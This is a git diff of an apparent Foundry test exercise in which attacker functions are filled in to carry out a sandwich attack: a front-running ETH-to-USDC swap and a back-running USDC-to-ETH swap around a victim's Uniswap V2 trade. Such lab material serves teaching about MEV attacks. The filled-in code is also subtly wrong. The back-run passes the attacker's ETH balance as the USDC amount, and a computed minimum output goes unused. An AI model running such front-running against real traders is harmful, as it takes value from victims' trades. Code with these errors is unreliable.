@@ -83,12 +83,43 @@ contract SandwichPracticeTest is SandwichSetUp {
     function _attackerAction1() internal {
         // victim swap ETH to USDC (front-run victim)
         // implement here
+        vm.startPrank(attacker);
+        address[] memory path = new address[](2);
+        path[0] = address(weth);
+        path[1] = address(usdc);
+
+        // # Discussion 1: how to get victim tx detail info ?
+        // without attacker action, original usdc amount out is 98715803, use 5% slippage
+        // originalUsdcAmountOutMin = 93780012;
+        uint256 originalUsdcAmountOut = 98715803;
+        uint256 originalUsdcAmountOutMin = (originalUsdcAmountOut * 95) / 100;
+
+        uniswapV2Router.swapExactETHForTokens{ value: 1 ether }(
+            0,
+            path,
+            attacker,
+            block.timestamp
+        );
+        vm.stopPrank();
     }
 
     // # Practice 2: attacker sandwich attack
     function _attackerAction2() internal {
         // victim swap USDC to ETH
         // implement here
+        vm.startPrank(attacker);
+        address[] memory path = new address[](2);
+        path[0] = address(usdc);
+        path[1] = address(weth);
+
+        uniswapV2Router.swapExactTokensForETH(
+            attacker.balance,
+            0,
+            path,
+            attacker,
+            block.timestamp
+        );
+        vm.stopPrank();
     }
 
     // # Discussion 2: how to maximize profit ?
